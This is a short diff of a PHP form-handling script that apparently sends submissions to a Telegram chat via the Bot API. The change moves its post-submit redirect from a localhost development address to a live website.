@@ -40,7 +40,7 @@ if(!fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&p
     die();
 }
 
-header('Location: http://localhost/wooden');
+header('Location: http://www.lovevscash.com.ua/');
 exit();
 
 
